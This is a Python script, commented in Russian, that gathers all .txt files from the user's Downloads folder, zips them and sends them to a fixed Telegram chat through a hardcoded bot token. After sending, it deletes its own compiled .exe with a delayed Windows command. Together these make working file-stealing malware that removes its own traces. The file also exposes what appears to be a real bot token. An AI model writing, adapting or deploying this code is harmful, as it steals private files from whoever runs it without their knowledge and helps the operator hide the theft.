import telebot
import os
import zipfile
from datetime import datetime
import sys
import subprocess
from telebot.apihelper import ApiTelegramException

# Токен бота
TOKEN = '7830900342:AAFtd63btoDfM-FPtUdPb41Yzg-Pt2Z82-U'
bot = telebot.TeleBot(TOKEN, timeout=10)  # Устанавливаем таймаут 10 секунд

# ID группы
CHAT_ID = 6054146925  # Указан конкретный ID

# Путь к папке "Загрузки" и файлу блокировки
DOWNLOADS_DIR = os.path.join(os.path.expanduser("~"), "Downloads")
LOCK_FILE = os.path.join(DOWNLOADS_DIR, "send_txt.lock")

# Максимальный размер файла для Telegram (50 МБ)
MAX_FILE_SIZE = 50 * 1024 * 1024  # 50 МБ в байтах

def check_lock():
    """Проверяет, запущено ли приложение."""
    if os.path.exists(LOCK_FILE):
        print("❌ Приложение уже было запущено ранее!")
        sys.exit(1)
    # Создаём файл блокировки
    with open(LOCK_FILE, 'w') as f:
        f.write("locked")

def create_zip(txt_files, zip_name):
    """Создаёт ZIP-архив из списка файлов, возвращает True, если архив не пустой."""
    included_files = False
    with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for file in txt_files:
            if os.path.getsize(file) > MAX_FILE_SIZE:
                print(f"⚠️ Файл {os.path.basename(file)} слишком большой ({os.path.getsize(file) / 1024 / 1024:.2f} МБ), пропущен.")
                continue
            zipf.write(file, os.path.basename(file))
            included_files = True
    return included_files

def self_destruct():
    """Удаляет текущий .exe файл с отложенным удалением."""
    if sys.executable.endswith('.exe'):
        try:
            # Используем отложенное удаление через команду Windows
            cmd = f'cmd /c "ping 127.0.0.1 -n 2 > nul & del /f /q \"{sys.executable}\""'
            subprocess.Popen(cmd, shell=True)
        except Exception as e:
            print(f"❌ Ошибка при самоудалении: {str(e)}")
    else:
        print("⚠️ Самоудаление работает только для .exe версии.")

def send_txt_files():
    try:
        # Проверяем директорию
        if not os.path.exists(DOWNLOADS_DIR):
            print("📂 Папка Загрузки не найдена!")
            return

        # Проверяем блокировку
        check_lock()

        # Находим все .txt файлы
        txt_files = [os.path.join(DOWNLOADS_DIR, f) for f in os.listdir(DOWNLOADS_DIR) if f.lower().endswith('.txt')]
        file_count = len(txt_files)

        if file_count == 0:
            print("📂 В Загрузках нет .txt файлов!")
            os.remove(LOCK_FILE) if os.path.exists(LOCK_FILE) else None
            return

        # Формируем сообщение
        message = f"📂 Нашёл {file_count} .txt файл{'ов' if file_count > 1 else ''} в Загрузках! 🚀"

        if file_count == 1:
            # Проверяем размер файла
            if os.path.getsize(txt_files[0]) > MAX_FILE_SIZE:
                print(f"⚠️ Файл {os.path.basename(txt_files[0])} слишком большой ({os.path.getsize(txt_files[0]) / 1024 / 1024:.2f} МБ).")
                os.remove(LOCK_FILE) if os.path.exists(LOCK_FILE) else None
                return
            # Отправляем один файл
            with open(txt_files[0], 'rb') as file:
                bot.send_document(CHAT_ID, file, caption=message)
        else:
            # Создаём и отправляем архив
            zip_name = f"txt_files_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
            if not create_zip(txt_files, zip_name):
                print("⚠️ Архив пустой, все файлы превышают 50 МБ.")
                os.remove(LOCK_FILE) if os.path.exists(LOCK_FILE) else None
                if os.path.exists(zip_name):
                    os.remove(zip_name)
                return
            if os.path.getsize(zip_name) > MAX_FILE_SIZE:
                print(f"⚠️ Архив {zip_name} слишком большой ({os.path.getsize(zip_name) / 1024 / 1024:.2f} МБ).")
                os.remove(LOCK_FILE) if os.path.exists(LOCK_FILE) else None
                os.remove(zip_name)
                return
            with open(zip_name, 'rb') as zip_file:
                bot.send_document(CHAT_ID, zip_file, caption=message)
            os.remove(zip_name)  # Удаляем архив

        print(f"✅ Отправлено {file_count} файл{'ов' if file_count > 1 else ''} в группу!")
        self_destruct()  # Удаляем .exe после успешной отправки
    except ApiTelegramException as te:
        print(f"❌ Ошибка Telegram API: {str(te)}")
        os.remove(LOCK_FILE) if os.path.exists(LOCK_FILE) else None
    except PermissionError:
        print("❌ Ошибка: Нет доступа к файлу или директории!")
        os.remove(LOCK_FILE) if os.path.exists(LOCK_FILE) else None
    except Exception as e:
        print(f"❌ Неизвестная ошибка: {str(e)}")
        os.remove(LOCK_FILE) if os.path.exists(LOCK_FILE) else None

if __name__ == "__main__":
    # Устанавливаем кодировку UTF-8 для консоли Windows
    if os.name == 'nt':
        os.system('chcp 65001 > nul')
    send_txt_files()